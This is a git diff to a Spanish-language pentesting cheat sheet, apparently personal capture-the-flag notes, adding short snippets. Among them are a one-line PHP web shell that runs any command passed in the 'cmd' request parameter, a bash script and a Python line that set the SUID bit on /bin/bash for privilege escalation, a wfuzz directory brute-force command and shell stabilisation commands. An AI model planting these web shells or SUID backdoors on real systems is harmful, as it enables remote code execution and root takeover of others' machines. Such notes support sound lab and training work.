@@ -33,6 +33,7 @@ stty -echo raw;fg
     reset
 export TERM=xterm
 export SHELL=bash
+stty size # por si no sabes las medidas de tu pantalla
 stty rows  51 columns 189
 ```
 
@@ -79,10 +80,10 @@ systemctl-timers
 watch -n 1 ls -l /bin/bash # ver cada segundo ese comando
 ```
 
-## Find
+## Find 
 
 ```
-find \-perm -4000 2>/dev/null
+find \-perm -4000 2>/dev/null #SUID
 
 ```
 
@@ -96,13 +97,48 @@ os.system("chmod u+s /bin/bash")
 
 ```
 
+## WFUZZ
+
+```
+wfuzz -c --hc=404 -t 200 -w rockyou.txt http://example.com/FUZZ
+
+```
+
+## PHP reverse shell 
+
+
+```php
+<?php
+
+echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
+
+?>
+
+```
+Existen variantes...
+
+```php
 
 
 
+```
 
 
+## mkdir crear mas de un directorio 
+
+```bash
+mkdir -p /uno/subdirectorio2/tres
+```
 
 
+## Shebang
+
+```bash
+#!/bin/bash
+
+chmod u+s /bin/bash
+
+```
 
 
 
